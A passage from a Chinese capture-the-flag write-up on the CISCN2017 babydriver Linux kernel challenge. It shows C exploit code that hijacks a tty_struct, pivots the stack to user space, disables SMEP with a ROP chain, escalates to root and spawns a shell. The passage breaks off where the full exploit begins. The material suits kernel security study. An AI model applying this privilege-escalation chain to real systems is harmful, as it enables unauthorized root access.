<h4 id="4-1-劫持栈指针"><a href="#4-1-劫持栈指针" class="headerlink" title="4.1) 劫持栈指针"></a>4.1) 劫持栈指针</h4><p>我们需要通过 ROP 来完成上述操作，但问题是，<strong>用户无法控制内核栈</strong>。因此我们必须使用一些特殊 gadget 来<strong>将栈指针劫持到用户空间</strong>，之后再利用用户空间上的 ROP 链进行一系列控制流跳转。</p>
<p>获取 gadget 的方式有很多。可以使用之前用的 <code>ROPgadget</code> 工具，优点是可以将分析结果通过管道保存至文件中，但缺点是该工具在 kernel 层面上会跑的很慢。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary vmlinux</span><br></pre></td></tr></table></figure>

<p>有个速度比较快的工具可以试试，那就是 <code>ropper</code>工具：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install ropper</span><br><span class="line">ropper --file vmlinux --console</span><br></pre></td></tr></table></figure>

<p>我们可以手动构造一个 <strong>fake_tty_operations</strong>，并修改其中的 <code>write</code> 函数指针指向一个 xchg 指令。这样当对 <code>/dev/ptmx</code> 执行 write 操作时，内核就会通过以下调用链：</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tty_write` -&gt; `do_tty_write` -&gt; `do_tty_write` -&gt; `n_tty_write` -&gt; `tty-&gt;ops-&gt;write</span><br></pre></td></tr></table></figure>
</blockquote>
<p>进一步使用到 <code>tty-&gt;ops-&gt;write</code>函数指针，最终执行 <code>xchg</code> 指令。</p>
<p>但问题是，执行什么样的 xchg 指令？通过动态调试与 IDA 静态分析，最终找到了实际调用 <code>tty-&gt;ops-&gt;write</code>的指令位置：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF814DC0C3                 call    qword ptr [rax+<span class="number">38</span>h]</span><br></pre></td></tr></table></figure>

<p>由于当控制流执行至此处时，只有 <code>%rax</code> 是用户可控的（即<code>fake_tty_operations</code>基地址），因此我们尝试使用以下 gadget，劫持 <code>%rsp</code> 指针至用户空间：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffff8100008a</span> : xchg eax, esp ; ret</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：<code>xchg eax, esp</code>将<strong>清空两个寄存器的高位部分</strong>。因此执行完成后，%rsp 的高四字节为0，此时指向用户空间。我们可以使用 mmap 函数占据这块内存，并放上 ROP 链。</p>
</blockquote>
<p>以下是劫持栈指针的部分代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line"><span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">ioctl(fd1, <span class="number">65537</span>, <span class="number">0x2e0</span>);</span><br><span class="line"></span><br><span class="line">close(fd1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 申请 tty_struct</span></span><br><span class="line"><span class="type">int</span> master_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造一个 fake tty_operators</span></span><br><span class="line"><span class="type">u_int64_t</span> fake_tty_ops[] = &#123;</span><br><span class="line">    <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    xchg_eax_esp_addr, <span class="comment">// int  (*write)(struct tty_struct*, const unsigned char *, int)</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] fake_tty_ops constructed\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">u_int64_t</span> hijacked_stack_addr = ((<span class="type">u_int64_t</span>)fake_tty_ops &amp; <span class="number">0xffffffff</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] hijacked_stack addr: %p\n&quot;</span>, (<span class="type">char</span>*)hijacked_stack_addr);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* fake_stack = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> ((fake_stack = mmap(</span><br><span class="line">    (<span class="type">char</span>*)(hijacked_stack_addr &amp; (~<span class="number">0xfff</span>)),    <span class="comment">// addr, 页对齐</span></span><br><span class="line">    <span class="number">0x1000</span>,                                     <span class="comment">// length</span></span><br><span class="line">    PROT_READ | PROT_WRITE,                     <span class="comment">// prot</span></span><br><span class="line">    MAP_PRIVATE | MAP_ANONYMOUS,                <span class="comment">// flags</span></span><br><span class="line">    <span class="number">-1</span>,                                         <span class="comment">// fd</span></span><br><span class="line">    <span class="number">0</span>)                                          <span class="comment">// offset</span></span><br><span class="line">    ) == MAP_FAILED)  </span><br><span class="line">    perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调试时先装载页面</span></span><br><span class="line">fake_stack[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]     fake_stack addr: %p\n&quot;</span>, fake_stack);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取 tty_struct 结构体的所有数据</span></span><br><span class="line"><span class="type">int</span> ops_ptr_offset = <span class="number">4</span> + <span class="number">4</span> + <span class="number">8</span> + <span class="number">8</span>;</span><br><span class="line"><span class="type">char</span> overwrite_mem[ops_ptr_offset + <span class="number">8</span>];</span><br><span class="line"><span class="type">char</span>** ops_ptr_addr = (<span class="type">char</span>**)(overwrite_mem + ops_ptr_offset);</span><br><span class="line"></span><br><span class="line">read(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] origin ops ptr addr: %p\n&quot;</span>, *ops_ptr_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改并覆写 tty_struct 结构体</span></span><br><span class="line">*ops_ptr_addr = (<span class="type">char</span>*)fake_tty_ops;</span><br><span class="line">write(fd2, overwrite_mem, <span class="keyword">sizeof</span>(overwrite_mem));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] hacked ops ptr addr: %p\n&quot;</span>, *ops_ptr_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发 tty_write</span></span><br><span class="line"><span class="comment">// 注意使用 write 时， buf 指针必须有效，否则会提前返回 EFAULT</span></span><br><span class="line"><span class="type">int</span> buf[] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">write(master_fd, buf, <span class="number">8</span>);</span><br></pre></td></tr></table></figure>

<p>可以看到栈指针已经成功被劫持到用户空间中：</p>
<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20221022230518.png">![image-20211013163918810](&#x2F;picture&#x2F;内核学习入门-CISCN2017_babydriver 复现&#x2F;image-20211013163918810.png)</a></p>
<h4 id="4-2-关闭-SMEP-ret2usr提权"><a href="#4-2-关闭-SMEP-ret2usr提权" class="headerlink" title="4.2) 关闭 SMEP + ret2usr提权"></a>4.2) 关闭 SMEP + ret2usr提权</h4><p>劫持栈指针后，我们现在可以尝试提权。正常来说，在<strong>内核</strong>里需要执行以下代码来进行提权：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> * <span class="title">root_cred</span> =</span> prepare_kernel_cred(<span class="literal">NULL</span>);</span><br><span class="line">commit_creds(root_cred);</span><br></pre></td></tr></table></figure>

<p>其中，<code>prepare_kernel_cred</code>函数用于获取传入 <code>task_struct</code> 结构指针的 cred 结构。需要注意的是，如果传入的指针是 <strong>NULL</strong>，则<strong>函数返回的 cred 结构将是 init_cred，其中uid、gid等等均为 root 级别</strong>。</p>
<p><code>commit_creds</code>函数用于将当前进程的 <code>cred</code> 更新为新传入的 <code>cred</code> 结构，如果我们将当前进程的 cred 更新为 root 等级的 cred，则达到我们提权的目的。</p>
<p>为了利用简便，我们可以先关闭 SMEP，跳转进用户代码中直接执行预编译好的提权指令。</p>
<p>SMEP 标志在寄存器 CR4 上，因此我们可以通过重设 CR4 寄存器来关闭 SMEP，最后提权：</p>
<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20221022230518.png">![image](&#x2F;picture&#x2F;内核学习入门-CISCN2017_babydriver 复现&#x2F;c76896800a175ad42f2bcdd31c5c083f.png)</a></p>
<p>我们先看一下当前的 cr4 寄存器的值</p>
<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20221022230518.png">![image-20211013172645328](&#x2F;picture&#x2F;内核学习入门-CISCN2017_babydriver 复现&#x2F;image-20211013172645328.png)</a></p>
<p>之后只要将 cr4 覆盖为 0x6f0 即可。</p>
<p>相关实现如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">set_root_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">void</span>* (*prepare_kernel_cred)(<span class="type">void</span>*) = (<span class="type">void</span>* (*)(<span class="type">void</span>*))prepare_kernel_cred_addr;</span><br><span class="line">    <span class="type">void</span> (*commit_creds)(<span class="type">void</span>*) = (<span class="type">void</span> (*)(<span class="type">void</span>*))commit_creds_addr;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> * root_cred = prepare_kernel_cred(<span class="literal">NULL</span>);</span><br><span class="line">    commit_creds(root_cred);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="comment">// 准备 ROP</span></span><br><span class="line">    <span class="type">u_int64_t</span>* hijacked_stack_ptr = (<span class="type">u_int64_t</span>*)hijacked_stack_addr;</span><br><span class="line">    hijacked_stack_ptr[<span class="number">0</span>] = pop_rdi_addr;              <span class="comment">// pop rdi; ret</span></span><br><span class="line">    hijacked_stack_ptr[<span class="number">1</span>] = <span class="number">0x6f0</span>;                     <span class="comment">// new cr4</span></span><br><span class="line">    hijacked_stack_ptr[<span class="number">2</span>] = mov_cr4_rdi_pop_rbp_addr;  <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    hijacked_stack_ptr[<span class="number">3</span>] = <span class="number">0</span>;                         <span class="comment">// dummy</span></span><br><span class="line">    hijacked_stack_ptr[<span class="number">4</span>] = (<span class="type">u_int64_t</span>)set_root_cred;  <span class="comment">// set root</span></span><br><span class="line">    <span class="comment">// todo ROP</span></span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-3-返回用户态-get-shell"><a href="#4-3-返回用户态-get-shell" class="headerlink" title="4.3) 返回用户态 + get shell"></a>4.3) 返回用户态 + get shell</h4><blockquote>
<p>当我们提权了当前进程后，剩下要做的事情就是<strong>返回至用户态</strong>并启动新shell。</p>
<p>可能有小伙伴会问，既然都劫持了内核控制流了，那是不是可以直接启动 shell ？为什么还要返回至用户态？</p>
<p>个人的理解是，劫持内核控制流后，由于改变了内核的正常运行逻辑，因此此时内核鲁棒性降低，稍微敏感的一些操作都有可能会导致内核挂掉。最稳妥的方式是回到更加稳定的用户态中，而且 root 权限的用户态程序同样可以做到内核权限所能做到的事情。</p>
<p>除了上面所说的以外，还有一个很重要的原因是：一般情况下在用户空间构造特定目的的代码要比在内核空间简单得多。</p>
</blockquote>
<p>如何从内核态返回至用户态中？我们可以从 syscall 的入口代码入手，先看看这部分代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line">  SWAPGS_UNSAFE_STACK</span><br><span class="line"><span class="title function_">GLOBAL</span><span class="params">(entry_SYSCALL_64_after_swapgs)</span></span><br><span class="line">  movq  %rsp, <span class="title function_">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span></span><br><span class="line">  movq  <span class="title function_">PER_CPU_VAR</span><span class="params">(cpu_current_top_of_stack)</span>, %rsp</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">  pushq  $__USER_DS      <span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line">  pushq  <span class="title function_">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span>  <span class="comment">/* pt_regs-&gt;sp */</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_">ENABLE_INTERRUPTS</span><span class="params">(CLBR_NONE)</span></span><br><span class="line">  pushq  %r11        <span class="comment">/* pt_regs-&gt;flags */</span></span><br><span class="line">  pushq  $__USER_CS      <span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">  pushq  %rcx        <span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">  pushq  %rax        <span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line">  pushq  %rdi        <span class="comment">/* pt_regs-&gt;di */</span></span><br><span class="line">  pushq  %rsi        <span class="comment">/* pt_regs-&gt;si */</span></span><br><span class="line">  pushq  %rdx        <span class="comment">/* pt_regs-&gt;dx */</span></span><br><span class="line">  pushq  %rcx        <span class="comment">/* pt_regs-&gt;cx */</span></span><br><span class="line">  pushq  $-ENOSYS      <span class="comment">/* pt_regs-&gt;ax */</span></span><br><span class="line">  pushq  %r8        <span class="comment">/* pt_regs-&gt;r8 */</span></span><br><span class="line">  pushq  %r9        <span class="comment">/* pt_regs-&gt;r9 */</span></span><br><span class="line">  pushq  %r10        <span class="comment">/* pt_regs-&gt;r10 */</span></span><br><span class="line">  pushq  %r11        <span class="comment">/* pt_regs-&gt;r11 */</span></span><br><span class="line">  sub  $<span class="params">(<span class="number">6</span>*<span class="number">8</span>)</span>, %rsp      <span class="comment">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span><br></pre></td></tr></table></figure>

<p>可以看到，控制流以进入入口点后，并立即执行<code>swapgs</code>指令，将当前 GS 寄存器切换成 kernel GS，之后切换栈指针至内核栈，并在内核栈中构造结构体 <code>pt_regs</code>。</p>
<p>该结构体声明如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>结合动态调试可以发现，在控制流到达 syscall 入口点之前，<code>pt_regs</code>结构体中的 <code>rip</code>、<code>cs</code>、<code>eflags</code>、<code>rsp</code> 以及 <code>ss</code> 五个寄存器均已压栈。</p>
<p>我们还可以在该文件中找到下面的代码片段</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">opportunistic_sysret_failed:</span><br><span class="line">  SWAPGS</span><br><span class="line">  jmp  restore_c_regs_and_iret</span><br><span class="line">  </span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * At this label, code paths which return to kernel and to user,</span></span><br><span class="line"><span class="comment"> * which come from interrupts/exception and from syscalls, merge.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">GLOBAL(restore_regs_and_iret)</span><br><span class="line">  RESTORE_EXTRA_REGS</span><br><span class="line">restore_c_regs_and_iret:</span><br><span class="line">  RESTORE_C_REGS</span><br><span class="line">  REMOVE_PT_GPREGS_FROM_STACK <span class="number">8</span></span><br><span class="line">  INTERRUPT_RETURN</span><br></pre></td></tr></table></figure>

<p>根据上面的分析信息，我们不难推断出，若想从内核态返回至用户态，则需要依次完成以下两件事情：</p>
<ul>
<li>再执行一次 swapgs 指令，将当前的 GS 寄存器从 kernel gs 换回 user gs</li>
<li>手动在栈上构造 iret 指令所需要的5个寄存器值，然后调用 iret 指令。</li>
</ul>
<p>因此最终实现的部分代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] got shell, welcome %s\n&quot;</span>, (getuid() ? <span class="string">&quot;user&quot;</span> : <span class="string">&quot;root&quot;</span>));</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_eflags, user_rsp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_iret_data</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__ __volatile__ (<span class="string">&quot;mov %%cs, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (user_cs));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">&quot;pushf&quot;</span>);</span><br><span class="line">    __asm__ __volatile__ (<span class="string">&quot;pop %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (user_eflags));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">&quot;mov %%rsp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (user_rsp));</span><br><span class="line">    __asm__ __volatile__ (<span class="string">&quot;mov %%ss, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (user_ss));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_iret_data();</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">&quot;[+] iret data saved.\n&quot;</span></span><br><span class="line">        <span class="string">&quot;    user_cs: %ld\n&quot;</span></span><br><span class="line">        <span class="string">&quot;    user_eflags: %ld\n&quot;</span></span><br><span class="line">        <span class="string">&quot;    user_rsp: %p\n&quot;</span></span><br><span class="line">        <span class="string">&quot;    user_ss: %ld\n&quot;</span>,</span><br><span class="line">        user_cs, user_eflags, (<span class="type">char</span>*)user_rsp, user_ss</span><br><span class="line">    );</span><br><span class="line">    [...]</span><br><span class="line">    <span class="type">u_int64_t</span>* hijacked_stack_ptr = (<span class="type">u_int64_t</span>*)hijacked_stack_addr;</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    hijacked_stack_ptr[idx++] = pop_rdi_addr;              <span class="comment">// pop rdi; ret</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = <span class="number">0x6f0</span>;</span><br><span class="line">    hijacked_stack_ptr[idx++] = mov_cr4_rdi_pop_rbp_addr;  <span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = <span class="number">0</span>;                         <span class="comment">// dummy</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = (<span class="type">u_int64_t</span>)set_root_cred;</span><br><span class="line">    <span class="comment">// 新添加的 ROP 链</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = swapgs_pop_rbp_addr;</span><br><span class="line">    hijacked_stack_ptr[idx++] = <span class="number">0</span>;                          <span class="comment">// dummy</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = iretq_addr;</span><br><span class="line">    hijacked_stack_ptr[idx++] = (<span class="type">u_int64_t</span>)get_shell;       <span class="comment">// iret_data.rip</span></span><br><span class="line">    hijacked_stack_ptr[idx++] = user_cs;</span><br><span class="line">    hijacked_stack_ptr[idx++] = user_eflags;</span><br><span class="line">    hijacked_stack_ptr[idx++] = user_rsp;</span><br><span class="line">    hijacked_stack_ptr[idx++] = user_ss;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4-4-ROP-注意点"><a href="#4-4-ROP-注意点" class="headerlink" title="4.4) ROP 注意点"></a>4.4) ROP 注意点</h4><p>在往常的用户层面的利用，我们无需关注<strong>缺页错误</strong>这样的一个无关紧要的异常。然而在内核利用中，缺页错误往往非常致命（不管是否是可恢复的，即正常的缺页错误也很致命），大概率会直接引发 <strong>double fault</strong>，致使内核重启：</p>
<p><a target="_blank" rel="noopener" href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20221022230518.png">![image-20211013173842187](&#x2F;picture&#x2F;内核学习入门-CISCN2017_babydriver 复现&#x2F;image-20211013173842187.png)</a></p>
<p>因此在构造 ROP 链时，应尽量避免在内核中直接引用那些<strong>尚未装载页面的内存页</strong>。</p>
<p>再一个问题是单步调试。在调试内核 ROP 链时，有概率会在单步执行时直接跑炸内核，但先给该位置下断点后，再跑至该位置则执行正常。这个调试…仁者见仁智者见智吧（滑稽）</p>
<h4 id="4-5-完整-exploit"><a href="#4-5-完整-exploit" class="headerlink" title="4.5) 完整 exploit"></a>4.5) 完整 exploit</h4><p>完整的 exploit 如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span 